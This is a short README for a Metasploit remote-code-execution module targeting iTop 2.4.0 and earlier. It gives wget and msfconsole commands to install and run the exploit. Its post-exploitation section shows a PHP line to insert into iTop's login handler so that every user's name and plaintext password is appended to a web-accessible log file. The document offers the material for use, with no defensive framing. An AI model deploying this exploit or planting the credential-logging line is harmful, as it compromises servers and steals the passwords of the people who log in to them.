# Metasploit module for RCE in iTop <= 2.4.0

Installation:
------

```bash
mkdir -p ~/.msf4/modules/exploits/itop/
wget https://raw.githubusercontent.com/attackercan/itop-2.4.0-rce/master/itop_rce.rb -O ~/.msf4/modules/exploits/itop/itop_rce.rb
msfconsole
use exploit/itop/itop_rce
```

Post-exploitation:
------

After you have RCE, you can sniff successful login attempts by changing `./application/loginwebpage.class.inc.php`:

```php
	// User is Ok, let's save it in the session and proceed with normal login
>>>>>	file_put_contents('./css/ui-lightness/images/log.txt', $sAuthUser.":".$sAuthPwd."\r\n", FILE_APPEND);
```

Pull requests are welcomed.

![msf](https://user-images.githubusercontent.com/17142772/38373739-934bf824-38fa-11e8-94fb-044a8147583c.png)
